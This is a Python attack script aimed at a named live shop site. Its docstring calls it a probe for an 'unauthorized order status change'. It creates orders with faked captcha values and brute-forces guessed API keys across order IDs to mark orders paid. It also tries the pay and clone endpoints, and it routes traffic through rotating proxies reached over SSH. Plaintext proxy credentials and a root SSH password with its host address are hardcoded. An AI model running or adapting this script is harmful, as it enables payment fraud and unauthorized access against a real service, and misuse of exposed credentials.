#!/usr/bin/env python3
"""qq1.lol change-status probe — unauthorized order status change via %61pi.php?act=change"""
import json
import re
import shlex
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path("/workspace/results/qq1.lol")
LOG = OUT / "change_probe.log"
HITS = OUT / "continue_hits.jsonl"
QG_KEY, QG_PWD = "C413ED6D", "344F550A6F8B"
JP_PASS, JP_HOST = "DX4LmrDaPfd9", "42.240.167.114"
JAR = "/tmp/qq1_change.jar"
_px = None


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    with open(HITS, "a") as f:
        f.write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:350]}")


def ssh(script, timeout=50):
    return subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", script],
        capture_output=True, text=True, timeout=timeout, errors="replace",
    ).stdout or ""


def proxy(force=False):
    global _px
    for _ in range(5):
        try:
            if _px and not force:
                return _px
            raw = ssh(f"curl -s 'https://share.proxy.qg.net/get?key={QG_KEY}&num=1'", 20)
            d = json.loads(raw)
            if d.get("code") == "SUCCESS" and d.get("data"):
                _px = f"http://{QG_KEY}:{QG_PWD}@{d['data'][0]['server']}"
                log(f"proxy {_px.split('@')[1]}")
                return _px
            log(f"proxy retry: {raw[:120]}")
        except Exception as e:
            log(f"proxy err: {e}")
        time.sleep(2)
        force = True
        _px = None
    return None


def curl(url, post=None, mt=20, force_px=False):
    px = proxy(force_px)
    if not px:
        return "", "000"
    hdr = "-H 'Referer: https://qq1.lol/' -H 'X-Requested-With: XMLHttpRequest'"
    pp = f"-X POST -d {shlex.quote(post)}" if post is not None else ""
    script = (
        f"curl -sk --max-time {mt} -x {shlex.quote(px)} -b {JAR} -c {JAR} -A 'Mozilla/5.0' "
        f"{hdr} {pp} -w '\\n__HTTP:%{{http_code}}' {shlex.quote(url)}"
    )
    out = ssh(script, mt + 25)
    if "__HTTP:" not in out:
        return out.strip(), "000"
    body, code = out.rsplit("__HTTP:", 1)
    return body.strip(), code.strip()


def session_order():
    ssh(f"rm -f {JAR}")
    proxy(True)
    curl(f"{BASE}/")
    buy, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102")
    for i in range(4):
        if buy and "hashsalt" in buy:
            break
        buy, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102", force_px=True)
        time.sleep(1)
    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy or "")
    hs_m = re.search(r"var hashsalt=(.+);", buy or "")
    if not csrf or not hs_m:
        log("no buy tokens")
        return None, None, None
    hs = subprocess.run(
        ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
        capture_output=True, text=True, timeout=8,
    ).stdout.strip()
    pay, _ = curl(
        f"{BASE}/ajax.php?act=pay",
        f"tid=102&num=1&inputvalue=chgprobe&csrf_token={csrf.group(1)}&hashsalt={hs}"
        "&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
    )
    tn = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
    tn = tn.group(1) if tn else None
    log(f"order tn={tn} pay={str(pay)[:120]}")
    return tn, csrf.group(1), hs


def probe_change():
    log("=== CHANGE STATUS PROBE ===")
    tn, csrf, hs = session_order()

    # Map change responses with various keys/zt/id
    log("--- response map ---")
    tests = [
        # no key
        f"{BASE}/%61pi.php?act=change&id=25949&zt=1",
        f"{BASE}/%61pi.php?act=change&id=1&zt=1",
        # wrong key
        f"{BASE}/%61pi.php?act=change&id=25949&zt=1&key=test",
        f"{BASE}/%61pi.php?act=change&id=25949&zt=1&key=wrong",
        f"{BASE}/%61pi.php?act=change&id=25949&zt=0&key=test",
        f"{BASE}/%61pi.php?act=change&id=25949&zt=2&key=test",
        f"{BASE}/%61pi.php?act=change&id=25949&zt=3&key=test",
        f"{BASE}/%61pi.php?act=change&id=25949&zt=4&key=test",
        f"{BASE}/%61pi.php?act=change&id=25949&zt=5&key=test",
        # empty zt
        f"{BASE}/%61pi.php?act=change&id=25949&key=test",
        # missing id
        f"{BASE}/%61pi.php?act=change&zt=1&key=test",
        # trade_no as id?
        f"{BASE}/%61pi.php?act=change&id={tn}&zt=1&key=test" if tn else None,
    ]
    for url in tests:
        if not url:
            continue
        body, code = curl(url)
        log(f"  {url.split('act=')[1][:60]} -> HTTP={code} {str(body)[:120]}")
        time.sleep(0.4)

    # Try to mark recent order IDs as completed with wrong/empty keys
    log("--- try mark paid (zt=1) ---")
    for key in ["", "test", "buyi", "qq1", "123456", "admin", "faka", "0", "1"]:
        for oid in [25949, 25948, 25947, 25940, 1, 100]:
            for zt in [1, 0, 2]:
                url = f"{BASE}/%61pi.php?act=change&id={oid}&zt={zt}&key={quote(key)}"
                body, code = curl(url)
                if not body:
                    continue
                if "成功" in body or '"code":1' in body or '"code":0' in body:
                    hit("change_ok", f"id={oid} zt={zt} key={key!r}", body)
                    # verify via search/getshop
                    s, _ = curl(f"{BASE}/%61pi.php?act=search&id={oid}&key={quote(key)}")
                    log(f"    search after: {str(s)[:150]}")
                elif "密钥错误" in body:
                    pass
                elif "不合法" in body or "不存在" in body or "请提供" in body or "确保" in body:
                    pass
                else:
                    log(f"  unusual id={oid} zt={zt} key={key!r}: {body[:100]}")
            time.sleep(0.15)

    # API pay endpoint
    log("--- api pay ---")
    for url in [
        f"{BASE}/%61pi.php?act=pay&tid=102&num=1&inputvalue=apipay&key=test",
        f"{BASE}/%61pi.php?act=pay&tid=102&num=1&inputvalue=apipay",
    ]:
        body, _ = curl(url)
        log(f"  GET {body[:120]}")
        body2, _ = curl(f"{BASE}/%61pi.php?act=pay", post="tid=102&num=1&inputvalue=apipay2&key=test")
        log(f"  POST {str(body2)[:120]}")

    # clone with operator keys
    log("--- clone keys ---")
    for key in ["buyi", "qq1", "123456", "admin", "faka", "test"]:
        body, _ = curl(f"{BASE}/%61pi.php?act=clone&key={quote(key)}")
        log(f"  clone key={key}: {str(body)[:100]}")
        if body and "class" in body and "错误" not in body:
            hit("clone", key, body)

    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== CHANGE PROBE DONE hits={n} ===")


if __name__ == "__main__":
    probe_change()
